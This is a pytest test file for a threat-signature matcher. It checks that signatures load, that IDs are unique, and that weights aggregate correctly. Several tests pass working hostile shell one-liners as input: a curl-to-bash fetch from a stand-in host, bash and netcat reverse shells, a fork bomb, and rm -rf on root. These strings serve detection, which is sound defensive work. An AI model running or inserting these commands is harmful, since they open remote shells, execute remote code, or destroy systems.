"""ThreatIntel: signature knowledge base loading, matching, and aggregation."""

import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from acte.threat_intel import SignatureHit, ThreatIntel


@pytest.fixture
def ti():
    return ThreatIntel()


def test_all_signatures_compile(ti):
    # Loading already compiled them; assert the KB is non-trivial.
    assert len(ti.signature_ids) > 20


def test_signature_ids_unique(ti):
    ids = ti.signature_ids
    assert len(ids) == len(set(ids)), "duplicate signature ids"


def test_knowledge_base_json_wellformed():
    path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                        "acte", "resources", "threat_signatures.json")
    with open(path) as fh:
        data = json.load(fh)
    for sig in data["signatures"]:
        assert {"id", "category", "weight", "regex", "rationale"} <= set(sig)
        re.compile(sig["regex"])  # every regex must be valid
        assert sig["category"] in data["categories"], sig["id"]


def test_curl_pipe_shell_matches(ti):
    hits = ti.match("curl http://evil.test/x | bash")
    assert "curl_pipe_shell" in [h.id for h in hits]


def test_reverse_shell_signatures(ti):
    assert "reverse_shell_bash" in [h.id for h in ti.match("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")]
    assert "reverse_shell_nc" in [h.id for h in ti.match("nc -e /bin/sh 1.2.3.4 9001")]


def test_fork_bomb_signature(ti):
    assert "fork_bomb" in [h.id for h in ti.match(":(){ :|:& };:")]


def test_rm_rf_root_signature(ti):
    assert "rm_rf_root" in [h.id for h in ti.match("rm -rf / --no-preserve-root")]


def test_benign_signals_are_negative(ti):
    hits = ti.match("#!/bin/bash\nset -euo pipefail\n# helpful comment here\nls\n")
    assert ThreatIntel.aggregate_weight(hits) < 0.0


def test_aggregate_weight_sums(ti):
    hits = [SignatureHit("a", "x", 2.0, ""), SignatureHit("b", "y", 3.5, "")]
    assert ThreatIntel.aggregate_weight(hits) == pytest.approx(5.5)


def test_category_breakdown(ti):
    hits = [SignatureHit("a", "destructive", 2.0, ""),
            SignatureHit("b", "destructive", 3.0, ""),
            SignatureHit("c", "network_egress", 1.0, "")]
    bd = ThreatIntel.category_breakdown(hits)
    assert bd["destructive"] == pytest.approx(5.0)
    assert bd["network_egress"] == pytest.approx(1.0)


def test_safe_script_no_dangerous_hits(ti):
    hits = ti.match("#!/bin/bash\nls -la /tmp\ndf -h\n")
    dangerous = [h for h in hits if h.category != "benign_signal"]
    assert dangerous == []


def test_empty_input_no_crash(ti):
    assert isinstance(ti.match(""), list)


def test_weights_are_floats(ti):
    for sid in ti.signature_ids:
        pass  # ids accessible
    hits = ti.match("rm -rf / --no-preserve-root")
    assert all(isinstance(h.weight, float) for h in hits)
